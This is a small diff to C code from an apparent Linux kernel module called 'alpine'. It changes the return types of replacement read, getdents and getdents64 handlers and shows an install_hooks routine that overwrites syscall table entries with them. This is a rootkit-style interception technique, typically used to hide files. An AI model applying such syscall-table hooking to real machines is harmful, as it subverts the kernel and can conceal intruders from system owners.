@@ -132,7 +132,7 @@ ssize_t alpine_ksys_read(unsigned int fd, char __user* buf, size_t count) {
 }
 
 
-int alpine_ksys_getdents(unsigned int fd,struct linux_dirent __user* dirent, unsigned int count){
+long alpine_ksys_getdents(unsigned int fd,struct linux_dirent __user* dirent, unsigned int count){
     echo("alpine getdents.\n");
     int r;
     struct fd f;
@@ -173,7 +173,7 @@ int alpine_ksys_getdents(unsigned int fd,struct linux_dirent __user* dirent, uns
 /** __NR_getdents64
  *
  */
-int alpine_ksys_getdents64(unsigned int fd,struct linux_dirent64 __user* dirent, unsigned int count){
+ssize_t alpine_ksys_getdents64(unsigned int fd,struct linux_dirent64 __user* dirent, unsigned int count){
     echo("getdents64\n");
     /*
     struct thread_info* ti = 0;
@@ -409,9 +409,9 @@ int install_hooks(void) {
         /** read
          */
         syscall_table[__NR_read] = (long unsigned int)alpine_ksys_read;
+
         /** getdents
          */
-        
         syscall_table[__NR_getdents] = (long unsigned int)alpine_ksys_getdents;
 
         /** getdents64
